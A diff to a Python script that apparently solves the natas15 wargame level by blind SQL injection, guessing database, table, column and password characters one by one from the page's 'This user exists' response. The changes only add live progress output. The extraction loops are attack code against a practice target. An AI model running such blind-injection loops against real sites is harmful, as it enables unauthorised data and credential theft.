@@ -1,7 +1,7 @@
 import requests
+import sys
 
 def flag(url,username,password,len_alphanum,table,column):
-    print("Extracting password:")
     alpha_num = "012345789abcdefgijklmnopqrstuvwxyzABCDEFGIJKLMNOPQRSTUVWXYZ6hH" 
     flag = ""
     letter = 0
@@ -14,11 +14,12 @@ def flag(url,username,password,len_alphanum,table,column):
             flag = flag + alpha_num[letter]
             letter = 0
         else:
+            sys.stdout.write(f"\rExtracting password: {flag}{alpha_num[letter].ljust(20)}")
+            sys.stdout.flush()
             letter += 1
-    print("The flag for natas15 is: " + flag) 
+    print(f"\rThe flag for natas15 is:  {flag.ljust(20)}")
 
 def cols(url,username,password,alpha_num,len_alphanum,database,table):
-    print("Getting column")
     column = ""
     letter = 0
     while letter < len_alphanum:
@@ -29,14 +30,14 @@ def cols(url,username,password,alpha_num,len_alphanum,database,table):
         if "This user exists" in sqli_r.text:
             column = column + alpha_num[letter]
             letter = 0
-    
         else:
+            sys.stdout.write(f"\rGetting column: {column}{alpha_num[letter].ljust(20)}")
+            sys.stdout.flush()
             letter += 1
-    print("Column is: " + column)
+    print(f"\rColumn is:  {column.ljust(20)}")
     flag(url,username,password,len_alphanum,table,column)
 
 def tables(url,username,password,alpha_num,len_alphanum,database):
-    print("Getting table")
     table = ""
     letter = 0
     while letter < len_alphanum:
@@ -48,12 +49,13 @@ def tables(url,username,password,alpha_num,len_alphanum,database):
             table = table + alpha_num[letter]
             letter = 0
         else:
+            sys.stdout.write(f"\rGetting table: {table}{alpha_num[letter].ljust(20)}")
+            sys.stdout.flush()
             letter += 1
-    print("Table is: " + table)
+    print(f"\rTable is:  {table.ljust(20)}")
     cols(url,username,password,alpha_num,len_alphanum,database,table)
 
 def database(url,username,password):
-    print("Getting database")
     site = requests.get(url,auth=(username,password))
     alpha_num = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" 
     if site.status_code == 401:
@@ -71,8 +73,10 @@ def database(url,username,password):
             database = database + alpha_num[letter]
             letter = 0
         else:
+            sys.stdout.write(f"\rGetting database: {database}{alpha_num[letter].ljust(20)}")
+            sys.stdout.flush()
             letter += 1
-    print("Database is: " + database)
+    print(f"\rDatabase is:  {database.ljust(20)}")
     tables(url,username,password,alpha_num,len_alphanum,database)
 
 if __name__=="__main__":
